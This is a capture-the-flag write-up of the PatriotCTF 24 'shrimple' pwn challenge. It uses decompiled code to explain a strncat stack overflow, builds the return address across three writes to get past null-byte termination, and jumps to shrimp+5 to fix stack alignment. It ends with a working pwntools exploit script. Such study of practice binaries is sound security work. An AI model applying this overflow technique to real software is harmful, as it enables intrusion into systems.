
![[shrimple]]


## Reflection
I did not manage to solve this challenge in time - I was able to jump to the shrimp function but encountered a misaligned stack. I found on the discord that jumping to shrimp+5 solved this issue.

I can see now that via the solution, we overwrite the first 5 bytes of the 8 bytes which leaves a 3 byte address. jumping to shrimp+5 nullifies this stack alignment issue.



```
beast@laptop:~/PatriotCTF 24/shrimple$ file shrimple
shrimple: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f02bd41d0b14378b591eb8e3d9dfdb2f3218dab1, for GNU/Linux 3.2.0, not stripped`
```


```
beast@laptop:~/PatriotCTF 24/shrimple$ checksec --file=shrimple
[*] '/home/beast/PatriotCTF 24/shrimple/shrimple'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```




Functions:

```
Non-debugging symbols:

0x0000000000401236  ignore_me
0x000000000040127d  shrimp
0x00000000004012f4  main
```





Main taken from Ghidra:

```
void main(void)

{
  char local_88 [64];
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined2 local_28;
  undefined local_26;
  
  puts("Welcome to the shrimplest challenge! It is so shrimple, we\'ll give you 3 shots.");
  for (i = 0; i < 3; i = i + 1) {
    printf("Remember to just keep it shrimple!\n>> ");
    fgets(local_88,0x32,stdin);
    puts("Adding shrimp...");
    local_48 = 0x2079736165206f73;
    local_40 = 0x73206f7320646e61;
    local_38 = 0x2c656c706d697268;
    local_30 = 0x7566206576616820;
    local_28 = 0x216e;
    local_26 = 0;
    strncat((char *)&local_48,local_88,0x32);
    printf("You shrimped the following: %s\n",&local_48);
  }
  puts("That\'s it, hope you did something cool...");
  return;
}
```


```
void shrimp(void)

{
  int iVar1;
  FILE *__stream;
  char local_9;
  
  __stream = (FILE *)FUN_00401140("/flag.txt",&DAT_00402008);
  if (__stream == (FILE *)0x0) {
    puts("Flag file not found, contact an admin!");
  }
  else {
    iVar1 = fgetc(__stream);
    local_9 = (char)iVar1;
    while (local_9 != -1) {
      putchar((int)local_9);
      iVar1 = fgetc(__stream);
      local_9 = (char)iVar1;
    }
    fclose(__stream);
  }
  return;
}
```


the 'shrimp' looks like ascii:

```
	local_48 = 0x2079736165206f73;
    local_40 = 0x73206f7320646e61;
    local_38 = 0x2c656c706d697268;
    local_30 = 0x7566206576616820;
    local_28 = 0x216e;
    local_26 = 0;
```

When run through, this adds the output string to local_48 with is then concatenated with `strncat`

`strncat((char *)&local_48,local_88,0x32);`

The combination of both strings leads to a buffer overflow situation where we can overwrite the return address with the shrimp function address to print the flag.

Unfortunately for us, `strncat` terminates on null bytes which means to write the address of the shrimp function `0x40127d` as the return address, to fill the register it would require null bytes which cant be written as strncat finishes when it encounters them.

To get around this, we use the first write to overwrite the first part of the current return address with a null byte and the added null byte from strncat, then we overwrite the next byte with the second input, followed by the actual address of the function to jump to.

#misaligned-stack 
Another example of an unaligned stack occurs when jumping to the shrimp function (i did not work this out during the challenge unfortunately) but this can be solved by jumping to shrimp+5) instead. 

#my-solution 

```
from pwn import *
  

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
        if args.GDB:  # Set GDBscript below
                return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        elif args.REMOTE:  # ('server', 'port')
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else:  # Run locally
                return process([exe] + argv, *a, **kw)

  

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
break *0x00000000004013f0
'''.format(**locals())

  
  
  

# Binary filename
exe = './shrimple'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
  
  
 

# Build the payload
payload_one = flat(
        b'a' * 43,
        b'\x00'
)

 
# Build the payload
payload_two = flat(
        b'b' * 42,
        b'\x00'
)


# Build the payload
payload_three = flat(
        b'b' * 38,
        b'\x82\x12\x40',
        b'\x00'
)

  
  

# Start program
io = start()
 


payload_one = flat(
        b'a' * 43,
        b'\x00'
)

payload_two = flat(
        b'b' * 42,
        b'\x00'
)
  

# Build the payload
payload_three = flat(
        b'b' * 38,
        b'\x82\x12\x40',
        b'\x00'
)

  

io.sendlineafter(b'>>', payload_one)
io.sendlineafter(b'>>', payload_two)
io.sendlineafter(b'>>', payload_three)
```